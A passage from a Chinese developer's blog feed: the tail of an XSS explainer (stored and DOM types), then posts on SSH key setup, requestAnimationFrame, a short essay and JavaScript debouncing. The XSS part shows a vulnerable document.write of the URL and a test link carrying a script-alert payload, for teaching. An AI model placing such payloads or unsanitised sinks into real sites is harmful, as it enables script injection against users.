title="持久型（又叫存储型）"></a>持久型（又叫存储型）</h3><p>我们上面提到的栗子就是一个持久型xss的示例，可以看处此类xss攻击不需要用户去点击URL进行触发，提前将恶意代码保存在了漏洞服务器或者客户端中，站点取出后会自动解析执行，相比反射型更具有攻击性，通常发生在网站的留言，评论，博客日志等交互处。</p><p>黑客可以利用它渗透网站、挂马、钓鱼…还有危害更大的xss蠕虫，跨站蠕虫用AJAX/JAVASCRIPT脚本语言编写的蠕虫病毒，可以在站点间实现病毒几何数级传播。</p><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>相比以上两种攻击类型，DOM型比较特殊，DOM型取出和执行恶意代码都由浏览器端完成，属于前端自身安全漏洞。主要由客户端的脚本通过DOM动态地输出到页面中，它不依赖于提交到服务器端，而从客户端获得DOM中的数据在本地执行.<br>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> temp = <span class="built_in">document</span>.URL;</span><br><span class="line"><span class="keyword">let</span> index = temp.indexOf(<span class="string">"content"</span>) + <span class="number">4</span>;</span><br><span class="line"><span class="keyword">let</span> par = temp.substring(index);</span><br><span class="line"><span class="built_in">document</span>.write(decodeURL(par));</span><br></pre></td></tr></table></figure></p><p>如果用户点击了带有下面链接的跳转，就会触发XSS漏洞<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//www.test.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>更多XSS攻击方式可以关注xss cheat sheet，会看到很多常见的xss攻击脚本列表，可以作为Poc用来检测web应用程序是否存在xss漏洞</p><h1 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h1><p>web安全-浅谈xss攻防（二）：更多的关注整理一些防御措施</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://book.douban.com/subject/25711796/" target="_blank" rel="noopener">《XSS跨站脚本剖析与防御》–邱永华</a><br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">《白帽子讲web安全》–吴翰清</a><br><a href="https://juejin.im/post/5bad9140e51d450e935c6d64" target="_blank" rel="noopener">《前端安全系列:如何防止XSS攻击？》–美团技术团队</a></p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下误将ssh密钥写入/root</title>
      <link href="/2018/10/05/linux-ssh-addToGithub-md/"/>
      <url>/2018/10/05/linux-ssh-addToGithub-md/</url>
      
        <content type="html"><![CDATA[<p>无论是使用github类似的开源平台还是搭建的git服务器来团队协作开发，我们总是需要使用本地ssh密钥来建立连接，如果要使用ssh服务linux下我们还需要通过终端安装ssh并且开启ssh服务<br><a id="more"></a></p><h1 id="一-关于ssh密钥"><a href="#一-关于ssh密钥" class="headerlink" title="一.关于ssh密钥"></a>一.关于ssh密钥</h1><p>首先应该检查下是否存在ssh密钥，<br>终端键入<code>ls -ah</code>查看是否存在.ssh文件，不存在则我们需要生成ssh密钥：<br>终端键入<code>ssh-keygen -t rsa -C &#39;you_email@email.com&#39;</code></p><p>回车之后下面是设置的密码，不设置回车即可。即：<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">Enter <span class="built_in">file</span> <span class="keyword">in</span> which <span class="built_in">to</span> save <span class="keyword">the</span> key (/home/.ssh/id_rsa): 【按回车】</span><br><span class="line"><span class="comment">/*这一步不需要修改名字，否则后面我们通过`ssh -T git@github.com`检测是否建立连接会失败，因为ssh默认会读取id_rsa这个公钥*/</span></span><br><span class="line">Enter passphrase (<span class="literal">empty</span> <span class="keyword">for</span> no passphrase): 【输入密码】</span><br><span class="line">Enter same passphrase again: 【再次输入密码】</span><br></pre></td></tr></table></figure></p><p>然后将.ssh/id_rsa.pub添加进去你github中ssh中即可</p><p>通过<code>sss -T git@github.com</code>检查连接是否建立成功，出现下面信息则提示已经建立连接喽<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Hi username! You<span class="symbol">'ve</span> successfully authenticated, but GitHub does <span class="keyword">not</span> provide shell <span class="keyword">access</span>.</span><br></pre></td></tr></table></figure></p><p>然后回去观察你的github ssh and GpG keys的对应的ssh小钥匙灰色已经变成了绿色</p><h1 id="二-关于ssh服务"><a href="#二-关于ssh服务" class="headerlink" title="二.关于ssh服务"></a>二.关于ssh服务</h1><p>对于linux下安装ssh服务相关，这里我做了简单的整理：</p><h3 id="1-查看ssh服务的状态"><a href="#1-查看ssh服务的状态" class="headerlink" title="1.查看ssh服务的状态"></a>1.查看ssh服务的状态</h3><p>输入<code>sudo service sshd status</code>:<br>如果出现No such file or directory相关提示，说明还没有安装ssh服务<br>如果提示Active:inactive(dead)，则已经安装了ssh服务，但是没有开启</p><h3 id="2-安装ssh服务"><a href="#2-安装ssh服务" class="headerlink" title="2.安装ssh服务"></a>2.安装ssh服务</h3><p>因为linux发行版众多，有一些不同的安装方式<br>redhat，fedora，centos等系列linux发行版可以尝试：<br><code>sudo yum install sshd</code>或者<code>sudo yum install openssh-server</code><br>debian，ubuntu，linux mint等系列的linux发行版尝试：<br><code>sudo apt-get install sshd</code>或者<code>sudo apt-get install openssh-server</code></p><h3 id="3-开启ssh服务"><a href="#3-开启ssh服务" class="headerlink" title="3.开启ssh服务"></a>3.开启ssh服务</h3><p>在终端输入<code>sudo service sshd start</code><br>提示Active: active (running) since Sun 2018-10-5 13:43:11 CST; 15s ago则说明ssh服务已经启动成功</p><h3 id="4-卸载ssh服务"><a href="#4-卸载ssh服务" class="headerlink" title="4.卸载ssh服务"></a>4.卸载ssh服务</h3><p>和安装对应，我们可以使用<br><code>sudo yum remove sshd</code>和<code>sudo apt-get -purge remove sshd</code><br>来卸载ssh服务</p><h1 id="三-解决问题-Permission-denied"><a href="#三-解决问题-Permission-denied" class="headerlink" title="三.解决问题(Permission denied)"></a>三.解决问题(Permission denied)</h1><p>因为误通过sudo命令生成ssh密钥，导致ssh密钥写入了/root系统文件，而引发后来一系列问题<br>丢失了截图，在一次试错后：<br><img src="https://www.chenqaq.com/assets/images/linux-ssh-error01.png" alt="请告诉我你的身份"><br>其实我安装git后已经设置了身份的，通过<code>git config --list</code>查看<br><img src="https://www.chenqaq.com/assets/images/linux-ssh-user01.png" alt="git user config"><br>于是我很自然的先搁置这个问题，下面是Permission denied的报错：<br><img src="https://www.chenqaq.com/assets/images/linux-ssh-error02.png" alt="Permission denied"><br>发现是权限问题，于是我反复检查，才发现自己误用了sudo命令，将ssh密钥写入了系统盘/root，导致权限不足，无法与远程建立连接。<br><img src="https://www.chenqaq.com/assets/images/linux-ssh01.png" alt="误用sudo生成ssh密钥"></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> github </tag>
            
            <tag> ssh协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>requestAnimationFrame优化web动画</title>
      <link href="/2018/05/15/js-requestAnimationFrame-md/"/>
      <url>/2018/05/15/js-requestAnimationFrame-md/</url>
      
        <content type="html"><![CDATA[<h2 id="requestAnimationFrame-是什么"><a href="#requestAnimationFrame-是什么" class="headerlink" title="requestAnimationFrame 是什么?"></a>requestAnimationFrame 是什么?</h2><p>在浏览器动画程序中，我们一般会使用定时器来循环每隔多少毫秒来移动物体一次，来使它产生动画的效果。requestAnimationFrame()函数是针对动画效果的 API，告诉浏览器您希望执行动画并请求浏览器在下一次重绘之前调用指定的函数来更新动画，可以把它用在 DOM 上的风格变化或 canvas 动画或 WebGL 中。</p><a id="more"></a><h2 id="requestAnimationFrame-相比定时器有哪些优势"><a href="#requestAnimationFrame-相比定时器有哪些优势" class="headerlink" title="requestAnimationFrame 相比定时器有哪些优势?"></a>requestAnimationFrame 相比定时器有哪些优势?</h2><p>那么问题就来了：CSS3 动画那么强，定时器同样可以完成一般的动画，我们为什么还需要 requestAnimationFrame()呢？</p><p>首先对于主流的 CSS3 动画来说，虽然一些主流浏览器都对它有比较好的支持，但是 ie8 以下（）是不支持的是其一，其二 CSS3 动画的运动轨迹比较少，有不小的局限性。</p><p>这时候我们会考虑到 JS，定时器使我们经常用到的方法，但是用定时器制作动画会发生【跳帧】问题，试想一下拥堵的高速公路上，最多每 16.7s 通过一辆车，结果突然插入一批 setinterval 的军车，强行要在 10s 通过。显然，这是超负荷的，想要顺利通过，只能让第三辆车军车直接消失。然而这是不现实的，于是就会堵车！</p><p>同样的，显示器 16.7ms<code>刷新间隔之前发生了其他的绘制的请求</code>（setTimeout），导致所有的第三帧丢失，继而导致动画断续显示，这就是过渡绘制带来的问题。这也是为何 setTimeout 的定时器值推荐最小使用<code>16.7ms</code>原因<code>（16.7 = 1000 / 60，即每秒60帧）</code></p><p>requestAnimationFrame 则会跟着浏览器的绘制走，如果浏览器设备的绘制间隔是 16.7ms，它就会 16.7ms 绘制；如果是 10ms，则会按 10ms 来绘制。这样就不会存在过度绘制的问题，动画不会掉帧。</p><h2 id="requestAnimationFrame-用法"><a href="#requestAnimationFrame-用法" class="headerlink" title="requestAnimationFrame 用法"></a>requestAnimationFrame 用法</h2><p>虽然说 CSS3 动画既方便又高效，但是对于 PC 端 IE8，9 之流，想要兼容某些动画效果，比如淡入淡出，该如何实现？一般情况下，IE10+我们使用 CSS3 实现，对于 IE9-之流，我们使用 setTimeout 实现。两套完全不同的 style.改下动画时间还要修改两处。requestAnimationFrame 跟 setTimeout 非常类似，都是单回调，用法也类似。</p><p>我们一般使用下面的兼容写法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.requestAnimFrame = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"><span class="regexp">/* function */</span> callback, <span class="regexp">/* DOMElement */</span> element</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">animloop</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  requestAnimFrame(animloop);</span><br><span class="line">  render();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p><img src="http://www.chenqaq.com/assets/images/CheckRequestAnimationFrame.jpg" alt="requestAnimationFrame兼容性"></p><p>主流浏览器都实现了 requestAnimationFrame 的支持，即使是 IE9-之流，通过一些优雅降级的方案，也可以做到不出错。</p><p>比如，Opera 浏览器的技术师 Erik Möller <a href="https://blogs.opera.com/news/" target="_blank" rel="noopener">把这个函数进行的封装</a>，使得它更好的兼容各种浏览器。<br>在 Erik Möller 标准函数的基础上加了兼容各种浏览器引擎的前缀。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> lastTime = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> vendors = [<span class="string">'webkit'</span>,<span class="string">'moz'</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> x=<span class="number">0</span>;x&lt;vendors.length &amp;&amp; !<span class="built_in">window</span>.requestAnimationFrame; ++x)&#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame = <span class="built_in">window</span>[vendors[x] + <span class="string">'RequestAnimationFrame'</span>];</span><br><span class="line">        <span class="built_in">window</span>.cancelAnimationFrame  = <span class="built_in">window</span>[vendors[x] + <span class="string">'CancleAniamtionFrame'</span>] ||</span><br><span class="line">                                       <span class="built_in">window</span>[vendors[x] + <span class="string">'CancleRequestAnimationFrame'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">window</span>.requestAnimationFrame)&#123;</span><br><span class="line">        <span class="built_in">window</span>.requestAnimationFrame = <span class="function"><span class="keyword">function</span>(<span class="params">callback,element</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> currTime = <span class="keyword">new</span>.Date().getTime();</span><br><span class="line">            <span class="keyword">var</span> timeToCall = <span class="built_in">Math</span>.max(<span class="number">0</span>,<span class="number">16.7</span> - (currTime - lastTime));</span><br><span class="line">            <span class="keyword">var</span> id = <span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                callback(currTime + timeToCall);</span><br><span class="line">            &#125;,timeToCall);</span><br><span class="line">            lastTime = currTime + timeToCall;</span><br><span class="line">            <span class="keyword">return</span> id;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">window</span>.cancelAnimationFrame)&#123;</span><br><span class="line">        <span class="built_in">window</span>.cancelAnimationFrame = <span class="function"><span class="keyword">function</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">            clearTimeout(id);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>在使用 canvas 绘画时这个函数更加合适，能得到更好的效果。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.reqestAnimFrame = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.requestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.webkitRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.mozRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.oRequestAnimationFrame ||</span><br><span class="line">    <span class="built_in">window</span>.msRequestAnimationFrame ||</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">callback, element</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.setTimeout(callback, <span class="number">1000</span> / <span class="number">60</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> canvas, context, toggle;</span><br><span class="line"></span><br><span class="line">init();</span><br><span class="line">animate();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  canvas = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>);</span><br><span class="line">  canvas.height = <span class="number">512</span>;</span><br><span class="line">  canvas.width = <span class="number">512</span>;</span><br><span class="line"></span><br><span class="line">  context = cavnas.getContext(<span class="string">"2d"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(canvas);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">animate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  reqestAnimFrame(animate);</span><br><span class="line">  draw();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime() * <span class="number">0.002</span>;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">Math</span>.sin(time) * <span class="number">192</span> + <span class="number">256</span>;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">Math</span>.cos(time * <span class="number">0.9</span>) * <span class="number">192</span> + <span class="number">256</span>;</span><br><span class="line">  toggle = !toggle;</span><br><span class="line"></span><br><span class="line">  context.fillStyle = toggle ? <span class="string">"rgb(200,100,20)"</span> : <span class="string">"rgb(20,20,100)"</span>;</span><br><span class="line">  context.beginPath();</span><br><span class="line">  context.arc(x, y, <span class="number">5</span>, <span class="number">0</span>, <span class="built_in">Math</span>.PI * <span class="number">2</span>, <span class="literal">true</span>);</span><br><span class="line">  context.closePath();</span><br><span class="line">  context.fill();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> web动画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>碎言心语-短笔记</title>
      <link href="/2018/04/09/life-aboutIT/"/>
      <url>/2018/04/09/life-aboutIT/</url>
      
        <content type="html"><![CDATA[<p>可以跟着<a href="https://zhuanlan.zhihu.com/p/35412015" target="_blank" rel="noopener">阿里的狼叔（花名）</a>了解一下前端近些几年的发展。从高中毕业接触前端开发近两年，但从大二才开始了解前端发展的历史和现状，也多少有些认识。</p><p>很多情况下，我们都是被动的接受者，这就好像我们拿的手机在更新换代，也就好像我们现在看到的网页和01年相比天壤之别，就像移动互联网时代兴起，我们从pc web慢慢转向移动端。这是一种我们后知后觉的变化趋势</p><p>因为我接触移动端稍稍要多于pc web端，<br>上次张小龙在微信公开课上声称微信用户已达10亿，微信小程序用户达1.7亿，微信悄然俨然成为一个操作系统，因为微信本身封闭，对外界来说，它是一个流量黑洞。眼看入口被微信把持，于是九大浏览器厂商联合发布”快应用”，一方面是为了夺回应用分支的主导权，说直接点就是在反攻”微信小程序”，防止被边缘化。另一方面官方也声称 “移动应用前端化”是大势所趋。</p><p>前端快速发展之下，必然改变我们未来的某些习惯。所以善待前端，感兴趣的就多深入些。</p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跟着underscore学习防抖和节流</title>
      <link href="/2018/03/20/js-debounce-throttle/"/>
      <url>/2018/03/20/js-debounce-throttle/</url>
      
        <content type="html"><![CDATA[<h1 id="有个开始吧！"><a href="#有个开始吧！" class="headerlink" title="有个开始吧！"></a>有个开始吧！</h1><p>网上有很多的防抖与节流的文章，自己也早有耳闻，之前看underscore的代码，也发现了两个与众不同的函数debounce和throttle，仿佛是有特定的用途。学习实践之后便总结下这篇文章。<br><a id="more"></a><br>在前端开发中经常遇到一些频繁触发的事件，比如</p><ul><li>键盘事件：keyup、keydown…</li><li>window：resize、scroll…</li><li>鼠标事件：mousedown、mousemove…</li></ul><p>那么什么是事件的频发触发呢？让我们写一个例子来了解事件的频繁触发；</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>学习事件的频发触发<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    * &#123;</span></span><br><span class="line"><span class="undefined">      padding: 0;</span></span><br><span class="line"><span class="undefined">      margin: 0;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">    <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="undefined">      width: 50vw;</span></span><br><span class="line"><span class="undefined">      height: 30vh;</span></span><br><span class="line"><span class="undefined">      margin: 50px auto;</span></span><br><span class="line"><span class="undefined">      background: yellowgreen;</span></span><br><span class="line"><span class="undefined">      border-radius: 5px;</span></span><br><span class="line"><span class="undefined">      text-align: center;</span></span><br><span class="line"><span class="undefined">      line-height: 30vh;</span></span><br><span class="line"><span class="undefined">      font-size: 30px;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"debounce.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>debounce.js代码如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> container = <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  container.innerHTML++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.onmousemove = getAction;</span><br></pre></td></tr></table></figure></p><p>效果如下：</p><p><img src="http://www.chenqaq.com/assets/images/debounce1.gif" alt="时间频发触发"></p><p>我们发现鼠标从盒子左侧平稳的滑到右侧，数字从1增加到了188，也就是说在极短的时间内getAction这个函数就触发了188次。可想而知，如果这个问题是复杂回调或者ajax请求等等，每个回调就必须在更短的时间内执行完毕，否则就会出现卡顿现象。</p><p>对于这个问题，防抖和节流就是两种很好的解决方案。</p><h1 id="防抖与节流介绍"><a href="#防抖与节流介绍" class="headerlink" title="防抖与节流介绍"></a>防抖与节流介绍</h1><p>防抖的原理就是：尽管时间触发，但是我一定要到事件触发n秒后才执行。如果在这个时间内又触发了这个事件，那就以新的事件的时间为准，触发n秒后才执行。主要是通过定时器来实现</p><p>而节流的原理是：如果持续触发事件，每隔一段时间，只执行一次事件。主要通过时间戳或者定时器来实现</p><h1 id="实现防抖debounce"><a href="#实现防抖debounce" class="headerlink" title="实现防抖debounce"></a>实现防抖debounce</h1><p>根据原理我们就可以来写第一版debounce代码：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      clearTimeout(timeout)</span><br><span class="line">      timeout = setTimeout(func, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">container.onmousemove = debounce(getAction, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure></p><p>效果如下</p><p><img src="http://www.chenqaq.com/assets/images/debounce2.gif" alt="debounce第一版"></p><p>从效果中很明显可以看出来，无论开始怎么在盒子内移动鼠标，数值都不会加1，直到鼠标停下来，并且等待1s后，getAction函数执行使数值加1。</p><h3 id="this带来的问题"><a href="#this带来的问题" class="headerlink" title="this带来的问题"></a>this带来的问题</h3><p>如果在getAction函数中<code>console.log(this)</code>，在不使用debounce函数时，<code>this</code>的值为<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>但是我们在使用我们的debounce函数时，这个this就指向了window！（这是由于嵌套函数内部的this都会失去方向，指向window对象。可参见我写的<a href="http://www.cnblogs.com/okaychen/p/7520472.html" target="_blank" rel="noopener">this四种绑定方式之间的奇淫技巧</a>）</p><p>所以我们必须要将this指向正确的对象：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timeout;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">timeout</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">    clearTimeout(timeout);</span><br><span class="line">    timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      func.apply(context);</span><br><span class="line">    &#125;, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="event对象"><a href="#event对象" class="headerlink" title="event对象"></a>event对象</h3><p>JavaScript在事件处理函数中提供事件对象event；<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAction</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e);</span><br><span class="line">  container.innerHTML = count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们不使用debounce函数，通过container.onmousemove调用，这里便会打印出MouseEvent对象<br><img src="http://www.chenqaq.com/assets/images/debounce3.png" alt="MouseEvent"></p><p>但是如果在通过debounce函数，却只会打印出undefined!让我们来改善一下debounce函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    clearTimeout(timeout)</span><br><span class="line">    timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      func.apply(context, args)</span><br><span class="line">    &#125;, wait);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>到此为止，在我们根据原理写的debounce的基础上，我们又解决了this指向和event对象的问题。</p><h3 id="立即执行"><a href="#立即执行" class="headerlink" title="立即执行"></a>立即执行</h3><p>这时候我们的代码已经很完善了，但是我们应该考虑到的一点是：<br>上面的代码我们总是需要等到事件停止触发n秒后。<br>我们想要的是：开始时候立即执行函数，然后等到停止触发n秒后，才可以重新触发执行。<br>我们加一个immediate参数判断是否立即执行。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> timeout, result;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> context = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout) clearTimeout(timeout);</span><br><span class="line">    <span class="keyword">if</span> (immediate) &#123;</span><br><span class="line">      <span class="comment">// 如果已经执行过，不再执行</span></span><br><span class="line">      <span class="keyword">var</span> callNow = !timeout;</span><br><span class="line">      timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        timeout = <span class="literal">null</span>;</span><br><span class="line">      &#125;, wait)</span><br><span class="line">      <span class="keyword">if</span> (callNow) result = func.apply(context, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      timeout = setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        func.apply(context, args);</span><br><span class="line">      &#125;, wait);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="取消"><a href="#取消" class="headerlink" 